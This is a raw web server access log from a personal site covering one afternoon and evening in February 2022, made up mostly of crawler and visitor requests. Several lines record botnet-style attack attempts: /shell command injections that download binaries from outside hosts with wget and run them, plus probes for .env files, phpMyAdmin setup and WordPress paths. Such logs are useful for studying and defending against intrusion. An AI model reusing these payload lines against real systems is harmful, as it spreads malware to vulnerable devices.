23.250.19.242 - - [21/Feb/2022:13:53:19 +0100] "\x03;\x8B\x13b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
130.211.54.158 - - [21/Feb/2022:13:53:23 +0100] "GET / HTTP/1.1" 400 248 "-" "python-requests/2.27.1"
37.44.238.168 - - [21/Feb/2022:14:08:27 +0100] "GET /shell?cd+/tmp;+wget+http:/\x5C/194.116.217.39/bins/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1" 301 162 "-" "Hello, Momentum"
128.14.141.34 - - [21/Feb/2022:14:16:07 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
196.191.96.91 - - [21/Feb/2022:14:17:13 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://54.151.27.172/.s4y/arm;sh+/tmp/arm HTTP/1.1" 301 162 "-" "Hello, world"
191.232.38.25 - - [21/Feb/2022:14:19:59 +0100] "GET / HTTP/1.1" 301 162 "-" "curl/7.58.0"
66.249.69.61 - - [21/Feb/2022:14:25:51 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.57 - - [21/Feb/2022:14:25:52 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.228.164.26 - - [21/Feb/2022:14:34:41 +0100] "GET /content/images/2021/10/Screenshot_8.png HTTP/2.0" 200 243714 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
45.224.40.26 - - [21/Feb/2022:14:45:30 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
190.104.238.38 - - [21/Feb/2022:14:48:40 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
118.222.204.192 - - [21/Feb/2022:14:53:16 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws HTTP/1.1" 301 162 "-" "Hello, world"
167.94.138.63 - - [21/Feb/2022:14:59:26 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
167.94.138.63 - - [21/Feb/2022:14:59:26 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.63 - - [21/Feb/2022:14:59:26 +0100] "PRI * HTTP/2.0" 400 150 "-" "-"
167.94.138.63 - - [21/Feb/2022:14:59:27 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
51.254.59.113 - - [21/Feb/2022:15:08:41 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
128.14.209.162 - - [21/Feb/2022:15:18:13 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.14.209.162 - - [21/Feb/2022:15:18:14 +0100] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
167.71.102.181 - - [21/Feb/2022:15:22:20 +0100] "\x00\x0E8\xF4\xB2\xAF\xD9&M5\xAB\x00\x00\x00\x00\x00" 400 150 "-" "-"
114.119.146.197 - - [21/Feb/2022:15:48:09 +0100] "GET /content/images/2021/12/Weekly.png HTTP/1.1" 200 286095 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
3.94.109.247 - - [21/Feb/2022:15:54:17 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.94.109.247 - - [21/Feb/2022:15:54:17 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Forem Feeds Importer"
37.44.238.168 - - [21/Feb/2022:15:57:24 +0100] "GET /shell?cd+/tmp;+wget+http:/\x5C/194.116.217.39/bins/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1" 301 162 "-" "Hello, Momentum"
193.174.89.19 - - [21/Feb/2022:16:25:07 +0100] "GET /webadmin/Index.action HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
207.46.13.232 - - [21/Feb/2022:16:27:20 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.232 - - [21/Feb/2022:16:27:20 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.156 - - [21/Feb/2022:16:27:24 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.245.62.225 - - [21/Feb/2022:16:54:59 +0100] "GET /config/getuser?index=0 HTTP/1.1" 400 248 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.61.19 - - [21/Feb/2022:17:00:22 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
157.55.39.23 - - [21/Feb/2022:17:16:49 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.88 - - [21/Feb/2022:17:16:56 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.232 - - [21/Feb/2022:17:44:16 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.232 - - [21/Feb/2022:17:44:17 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.156 - - [21/Feb/2022:17:44:21 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
167.71.102.181 - - [21/Feb/2022:17:58:49 +0100] "\x00\x0E8\xC8\xF7\x1A\x84\xE2p\x8C\x0B\x00\x00\x00\x00\x00" 400 150 "-" "-"
194.187.171.82 - - [21/Feb/2022:18:04:30 +0100] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)"
194.187.171.75 - - [21/Feb/2022:18:04:30 +0100] "GET /favicon.ico HTTP/2.0" 302 34 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)"
194.187.171.75 - - [21/Feb/2022:18:04:30 +0100] "GET /favicon.png HTTP/2.0" 200 2741 "-" "Mozilla/5.0 (compatible; Qwantify/1.0; +https://www.qwant.com/)"
82.145.215.206 - - [21/Feb/2022:18:15:42 +0100] "GET / HTTP/1.1" 200 13177 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
82.145.215.206 - - [21/Feb/2022:18:15:42 +0100] "GET /favicon.png HTTP/1.1" 200 2741 "-" "Go-http-client/1.1"
82.145.215.206 - - [21/Feb/2022:18:15:42 +0100] "GET /apple-touch-icon.png HTTP/1.1" 301 5 "-" "Go-http-client/1.1"
82.145.215.206 - - [21/Feb/2022:18:15:42 +0100] "GET /apple-touch-icon.png/ HTTP/1.1" 404 12232 "https://krzwiatrzyk.eu/apple-touch-icon.png" "Go-http-client/1.1"
205.185.127.43 - - [21/Feb/2022:18:22:59 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
173.168.91.109 - - [21/Feb/2022:18:23:19 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://54.151.27.172/.s4y/arm;sh+/tmp/arm HTTP/1.1" 301 162 "-" "Hello, world"
35.195.93.98 - - [21/Feb/2022:18:38:16 +0100] "GET / HTTP/1.1" 200 595 "-" "python-requests/2.27.1"
45.227.254.48 - - [21/Feb/2022:19:02:21 +0100] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-"
45.227.254.48 - - [21/Feb/2022:19:02:21 +0100] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-"
89.163.231.26 - - [21/Feb/2022:19:09:17 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.163.231.26 - - [21/Feb/2022:19:09:18 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.163.231.26 - - [21/Feb/2022:19:29:28 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
89.163.231.26 - - [21/Feb/2022:19:29:28 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.248.137.40 - - [21/Feb/2022:19:40:31 +0100] "GET / HTTP/1.1" 200 13172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
94.101.62.120 - - [21/Feb/2022:20:07:20 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
2.56.56.43 - - [21/Feb/2022:20:19:52 +0100] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
167.248.133.62 - - [21/Feb/2022:20:25:41 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
167.248.133.62 - - [21/Feb/2022:20:25:41 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.62 - - [21/Feb/2022:20:25:41 +0100] "PRI * HTTP/2.0" 400 150 "-" "-"
167.248.133.62 - - [21/Feb/2022:20:25:41 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.245.62.225 - - [21/Feb/2022:20:37:31 +0100] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.62.127 - - [21/Feb/2022:20:48:13 +0100] "GET http://85.255.1.106:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 162 "-" "-"
103.115.172.46 - - [21/Feb/2022:20:51:06 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
3.93.82.81 - - [21/Feb/2022:20:54:49 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.93.82.81 - - [21/Feb/2022:20:54:50 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Forem Feeds Importer"
75.119.138.152 - - [21/Feb/2022:21:04:42 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET / HTTP/2.0" 200 13159 "http://www.krzwiatrzyk.eu/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /blog/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /blog/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/blog/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /wp/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /wp/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/wp/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /wordpress/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /wordpress/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/wordpress/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /new/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /new/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/new/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /old/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:43 +0100] "GET /old/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/old/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /test/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /test/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/test/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /main/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /main/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/main/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /site/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /site/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/site/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /backup/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /backup/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/backup/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /demo/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /demo/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/demo/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /home/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:44 +0100] "GET /home/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/home/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:45 +0100] "GET /tmp/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:45 +0100] "GET /tmp/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/tmp/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:45 +0100] "GET /cms/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:45 +0100] "GET /cms/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/cms/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:45 +0100] "GET /dev/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
75.119.138.152 - - [21/Feb/2022:21:04:45 +0100] "GET /dev/ HTTP/2.0" 404 12219 "http://www.krzwiatrzyk.eu/dev/" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
